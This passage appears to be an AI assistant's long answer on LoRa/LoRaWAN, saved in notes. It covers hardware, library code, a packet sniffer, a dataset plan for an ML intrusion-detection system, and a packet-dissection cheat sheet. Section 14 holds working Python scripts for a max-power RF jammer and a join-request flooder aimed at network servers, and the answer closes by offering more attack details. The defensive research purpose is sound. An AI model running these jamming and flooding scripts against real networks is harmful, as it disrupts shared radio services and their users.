┌──────────────────────────────────────────────────┐
│  Heltec WiFi LoRa 32 V2 (ESP32 + LoRa)           │
│  • ESP32 + SX1276                                │
│  • WiFi + Bluetooth + LoRa                       │
│  • OLED display                                  │
│  • ~$15-20, great for development                │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  RAK WisBlock / RAK2287 (Gateway Concentrator)   │
│  • SX1302/SX1303 gateway chip                    │
│  • 8-channel gateway                             │
│  • Can receive multiple SF simultaneously        │
│  • ~$50-150                                      │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  LimeSDR / HackRF One (Software Defined Radio)   │
│  • General-purpose SDR                           │
│  • Can transmit/receive LoRa                     │
│  • Full control over modulation                  │
│  • ~$300+ (HackRF), ~$400+ (LimeSDR)             │
└──────────────────────────────────────────────────┘
```

### **13.2 Software Tools**

#### **RadioLib (Arduino Library)**
```cpp
// LoRa transmission with RadioLib
#include <RadioLib.h>

SX1276 radio = new Module(18, 26, 14, 33);  // NSS, DIO0, RST, DIO1

void setup() {
  // Initialize SX1276
  int state = radio.begin(868.1,      // Frequency (MHz)
                          125.0,      // Bandwidth (kHz)
                          9,          // Spreading Factor
                          7,          // Coding Rate
                          0x12,       // Sync Word
                          17,         // Output power (dBm)
                          8,          // Preamble length
                          0);         // Gain
  
  if (state == RADIOLIB_ERR_NONE) {
    Serial.println("LoRa init OK!");
  }
}

void loop() {
  // Send packet
  String message = "Hello LoRa!";
  int state = radio.transmit(message);
  
  if (state == RADIOLIB_ERR_NONE) {
    Serial.println("TX success!");
  }
  delay(5000);
}
```

#### **MCCI LoRaWAN Arduino LMIC**
```cpp
// LoRaWAN OTAA with LMIC
#include <lmic.h>
#include <hal/hal.h>

// OTAA credentials (MSB format!)
static const u1_t PROGMEM APPEUI[8] = { 0x00, 0x00, ... };
static const u1_t PROGMEM DEVEUI[8] = { 0x70, 0xB3, ... };
static const u1_t PROGMEM APPKEY[16] = { 0xAB, 0xCD, ... };

void onEvent(ev_t ev) {
  switch(ev) {
    case EV_JOINED:
      Serial.println("Network joined!");
      // Send uplink
      LMIC_setTxData2(1, mydata, sizeof(mydata)-1, 0);
      break;
    case EV_TXCOMPLETE:
      Serial.println("TX complete!");
      break;
  }
}

void setup() {
  os_init();
  LMIC_reset();
  LMIC_startJoining();
}
```

#### **ChirpStack (LoRaWAN Network Server)**
```bash
# Install ChirpStack on Raspberry Pi
sudo apt update
sudo apt install -y mosquitto postgresql

# Install ChirpStack
wget https://artifacts.chirpstack.io/downloads/chirpstack-network-server_3.x.x_linux_armv7.tar.gz
tar -xvzf chirpstack-network-server_3.x.x_linux_armv7.tar.gz
sudo mv chirpstack-network-server /usr/bin/

# Configure
sudo nano /etc/chirpstack-network-server/chirpstack-network-server.toml

# Start
sudo systemctl start chirpstack-network-server
```

#### **LoRa Packet Sniffer (Python)**
```python
#!/usr/bin/env python3
from LoRaRF import SX127x
import time

# Initialize SX1276
lora = SX127x()
lora.begin(freq=868.1,          # Frequency
           bw=125000,            # Bandwidth
           sf=9,                 # Spreading Factor
           cr=5,                 # Coding Rate 4/5
           syncWord=0x34,        # LoRaWAN sync word
           power=17,             # TX power
           preambleLen=8,        # Preamble length
           implicitHeader=False) # Explicit header

print("[*] LoRa sniffer started on 868.1 MHz, SF9")

while True:
    # Wait for packet
    if lora.available():
        # Read packet
        packet = lora.read()
        rssi = lora.packetRssi()
        snr = lora.snr()
        
        print(f"\n[+] Packet received!")
        print(f"    RSSI: {rssi} dBm")
        print(f"    SNR: {snr} dB")
        print(f"    Data: {packet.hex()}")
        
        # Parse LoRaWAN frame
        if len(packet) > 12:
            mhdr = packet[0]
            mtype = (mhdr >> 5) & 0x07
            
            if mtype == 0x02:  # Unconfirmed Data Up
                devaddr = int.from_bytes(packet[1:5], 'little')
                fcnt = int.from_bytes(packet[6:8], 'little')
                print(f"    MType: Unconfirmed Data Up")
                print(f"    DevAddr: 0x{devaddr:08X}")
                print(f"    FCnt: {fcnt}")
    
    time.sleep(0.1)
```

#### **GNU Radio LoRa Decoder**
```python
# GNU Radio companion flowgraph for LoRa decoding
# Available at: https://github.com/rpp0/gr-lora

# Install
git clone https://github.com/rpp0/gr-lora.git
cd gr-lora
mkdir build && cd build
cmake ..
make
sudo make install

# Use in GNU Radio Companion
# SDR Source → LoRa Receiver → Message Debug
```

---

## **14. ATTACK SCRIPT EXAMPLES**

### **14.1 LoRa Jammer (Wide-band)**
```python
#!/usr/bin/env python3
from LoRaRF import SX127x
import time
import random

def wideband_jammer(center_freq=868.1, duration=60):
    """
    Transmit continuous noise to jam LoRa communications
    """
    lora = SX127x()
    lora.begin(freq=center_freq, 
               bw=125000, 
               sf=7,  # SF7 for maximum duty cycle
               cr=5, 
               power=20,  # Max power
               preambleLen=8)
    
    print(f"[*] Starting wide-band jammer on {center_freq} MHz")
    print(f"[*] Duration: {duration} seconds")
    
    start_time = time.time()
    
    while time.time() - start_time < duration:
        # Transmit random data
        noise = bytes([random.randint(0, 255) for _ in range(200)])
        lora.write(noise)
        print(".", end="", flush=True)
        time.sleep(0.05)  # Small delay to comply with some duty cycle
    
    print("\n[+] Jamming complete")

if __name__ == "__main__":
    wideband_jammer(center_freq=868.1, duration=60)
```

### **14.2 Join Request Flooder**
```python
#!/usr/bin/env python3
from LoRaRF import SX127x
import time
import random

def join_request_flood(freq=868.1, count=100):
    """
    Flood network with fake join requests
    Overwhelm Network Server processing
    """
    lora = SX127x()
    lora.begin(freq=freq, bw=125000, sf=7, cr=5, 
               syncWord=0x34,  # LoRaWAN sync word
               power=17, preambleLen=8)
    
    print(f"[*] Flooding with {count} join requests")
    
    for i in range(count):
        # Craft Join Request frame
        mhdr = 0x00  # Join Request
        
        # Random AppEUI and DevEUI
        appeui = bytes([random.randint(0, 255) for _ in range(8)])
        deveui = bytes([random.randint(0, 255) for _ in range(8)])
        devnonce = bytes([random.randint(0, 255) for _ in range(2)])
        
        # Fake MIC (will fail auth, but still processed!)
        mic = bytes([random.randint(0, 255) for _ in range(4)])
        
        # Assemble frame
        frame = bytes([mhdr]) + appeui + deveui + devnonce + mic
        
        # Transmit
        lora.write(frame)
        print(f"[+] Sent join request {i+1}/{count}")
        time.sleep(1)  # 1 second between requests

if __name__ == "__main__":
    join_request_flood(freq=868.1, count=100)
```

### **14.3 Frame Counter Analyzer**
```python
#!/usr/bin/env python3
from LoRaRF import SX127x
from collections import defaultdict
import struct

def monitor_frame_counters():
    """
    Monitor frame counters to detect replays or resets
    """
    lora = SX127x()
    lora.begin(freq=868.1, bw=125000, sf=9, cr=5, 
               syncWord=0x34, power=17, preambleLen=8)
    
    # Track frame counters per DevAddr
    fcnt_db = defaultdict(lambda: {"last_fcnt": None, "reset_count": 0})
    
    print("[*] Monitoring frame counters...")
    
    while True:
        if lora.available():
            packet = lora.read()
            
            if len(packet) >= 12:
                mhdr = packet[0]
                mtype = (mhdr >> 5) & 0x07
                
                # Data frames (Unconfirmed or Confirmed)
                if mtype in [0x02, 0x04]:
                    devaddr = struct.unpack("<I", packet[1:5])[0]
                    fcnt = struct.unpack("<H", packet[6:8])[0]
                    
                    # Check for anomalies
                    if fcnt_db[devaddr]["last_fcnt"] is not None:
                        last = fcnt_db[devaddr]["last_fcnt"]
                        
                        if fcnt < last:
                            print(f"\n[!] ALERT: Frame counter RESET detected!")
                            print(f"    DevAddr: 0x{devaddr:08X}")
                            print(f"    Previous FCnt: {last}")
                            print(f"    Current FCnt: {fcnt}")
                            fcnt_db[devaddr]["reset_count"] += 1
                        elif fcnt == last:
                            print(f"\n[!] ALERT: Frame counter REPLAY detected!")
                            print(f"    DevAddr: 0x{devaddr:08X}")
                            print(f"    FCnt: {fcnt}")
                    
                    # Update database
                    fcnt_db[devaddr]["last_fcnt"] = fcnt
                    print(f"[+] DevAddr 0x{devaddr:08X}: FCnt={fcnt}")

if __name__ == "__main__":
    monitor_frame_counters()
```

---

## **15. DATASET COLLECTION STRATEGY**

For your ML-based IDS, collect these traffic patterns:

### **15.1 Benign Traffic Patterns**
```
Normal Operations:
├── OTAA join sequences (Join Request → Join Accept)
├── Periodic sensor uplinks (temperature, humidity, GPS)
│   └── Class A: Short RX windows after TX
├── Confirmed data frames (with ACKs)
├── Unconfirmed data frames (no ACKs)
├── MAC command exchanges (LinkCheck, DevStatus, ADR)
├── Different spreading factors (SF7-SF12)
├── Different bandwidths (125/250/500 kHz)
└── Normal frame counter progression
```

### **15.2 Attack Traffic Patterns**
```
Attack Scenarios:
├── Join request flooding (high rate of join attempts)
├── Jamming signatures (continuous transmissions, noise)
├── Selective jamming (targeting RX windows)
├── Frame replay attacks (duplicate FCnt)
├── Frame counter reset anomalies
├── Collision attacks (simultaneous transmissions)
├── Abnormal SF usage (e.g., SF12 when SF7 is optimal)
├── Malformed frames (invalid MIC, truncated)
└── DoS patterns (airtime saturation)
```

### **15.3 Feature Extraction**
```
Per-Packet Features:
- Timestamp
- Frequency channel
- Spreading Factor (SF7-SF12)
- Bandwidth (125/250/500 kHz)
- Coding Rate (4/5, 4/6, 4/7, 4/8)
- Packet length (bytes)
- RSSI (Received Signal Strength)
- SNR (Signal-to-Noise Ratio)
- MType (Join Request, Data Up, etc.)
- DevAddr (if data frame)
- FCnt (frame counter)
- FPort (application port)
- MIC validity (valid/invalid)
- Preamble length
- CRC status

Flow-Based Features:
- Inter-arrival time
- Packets per second (PPS)
- Bytes per second (BPS)
- Unique DevAddr count
- Join request rate
- FCnt progression rate
- Airtime utilization (%)
- Duty cycle compliance
- Collision rate
- Retransmission rate (for confirmed frames)

Time-Series Features:
- Moving average of RSSI/SNR
- FCnt delta over time
- Burst patterns
- Periodicity detection
- Anomalous gaps in transmission
```

---

## **16. LoRaWAN VERSIONS**

```
┌────────────────────────────────────────────────────┐
│           LoRaWAN 1.0 / 1.0.x (Original)           │
│  • Single NwkSKey for all security                 │
│  • DevEUI visible in Join Request                  │
│  • Simple, but security limitations                │
└────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────┐
│               LoRaWAN 1.1 (Enhanced)               │
│  • Separate keys for Network + Join Server         │
│  • NwkSKey split into multiple keys:               │
│    - FNwkSIntKey (Forwarding Network Integrity)    │
│    - SNwkSIntKey (Serving Network Integrity)       │
│    - NwkSEncKey (Network Session Encryption)       │
│  • Better roaming support                          │
│  • More secure join procedure                      │
│  • Rejoin mechanism                                │
│  • Backwards compatible with 1.0.x                 │
└────────────────────────────────────────────────────┘
```

---

## **17. QUICK REFERENCE: PACKET DISSECTION CHEAT SHEET**

```
LAYER-BY-LAYER BREAKDOWN:

LoRa PHY (seen over the air):
├── Preamble (8-65535 symbols)
├── PHY Header (optional, explicit mode):
│   └── Payload Length, CR, CRC flag
├── Payload (LoRaWAN MAC frame)
└── CRC (optional)

LoRaWAN MAC Frame:
├── MHDR (1 byte): 0x40
│   └── MType: 010 (Unconfirmed Data Up), Major: 00
├── DevAddr (4 bytes): 26 01 1F 3A (little-endian!)
├── FCtrl (1 byte): 0x80
│   └── ADR=1, ACK=0, FOptsLen=0
├── FCnt (2 bytes): 00 0A (Frame counter = 10)
├── FOpts (0-15 bytes): (empty)
├── FPort (1 byte): 0x01 (Application port)
├── FRMPayload (encrypted with AppSKey):
│   └── A3 2F 7B 9E 12 ... (application data)
└── MIC (4 bytes): 4B 9A C2 D5
    └── Computed with NwkSKey over entire frame

Decryption:
1. Extract encrypted payload: A3 2F 7B 9E 12 ...
2. Build AES block: Direction | DevAddr | FCnt | 0x00 | Counter
3. AES-128 encrypt block with AppSKey → Keystream
4. XOR Keystream with Ciphertext → Plaintext
5. Plaintext: {"temperature": 23.5, "humidity": 67}
```

---

That's the comprehensive LoRa/LoRaWAN breakdown!

**Key Takeaways:**
1. **LoRa (PHY)** = Chirp Spread Spectrum modulation (long range!)
2. **LoRaWAN (MAC)** = Network protocol with star-of-stars topology
3. **Spreading Factor** = Most important parameter (range vs. data rate trade-off)
4. **Three device classes** (A/B/C) with different power profiles
5. **Dual encryption** = NwkSKey (integrity) + AppSKey (confidentiality)
6. **OTAA recommended** over ABP for security

**Comparison Summary:**
- **WiFi**: High speed, short range, high power
- **BLE**: Medium speed, short range, ultra-low power
- **Zigbee**: Medium speed, medium range (mesh), low power
- **LoRa**: Low speed, LONG range (15+ km), ultra-low power

**Your Hardware Setup (SX1276):**
- Perfect for both node and gateway experimentation
- Supports all SF (7-12) and BW (125/250/500 kHz)
- Can sniff traffic + inject packets
- Compatible with Raspberry Pi via SPI

**Next Steps for Your Research:**
1. Set up SX1276 on Raspberry Pi 5
2. Deploy ChirpStack or TTN (The Things Network)
3. Create benign sensor nodes (temperature, motion, etc.)
4. Implement attack scripts (jamming, flooding, replay)
5. Capture PCAPs for ML training dataset
6. Extract features (RSSI, SNR, FCnt, airtime)
7. Train classifier (Random Forest, LSTM, CNN)

**Questions:**
- Want detailed SX1276 wiring/setup for Raspberry Pi 5?
- Need more attack implementation details?
- Dataset labeling strategy for anomaly detection?
- How to integrate with your existing WiFi/BLE/Zigbee research?

What's your next move in the LoRa research? 🎯

---

**Related**:
- [[LoRa/README|LoRa Home]]
- [[LoRa/Attacks/01-jamming-analysis|Jamming Attack Analysis]]
- [[LoRa/Tools/01-sx1276-setup|SX1276 Setup Guide]]
- [[README|Home]] • [[INDEX|Full Index]]
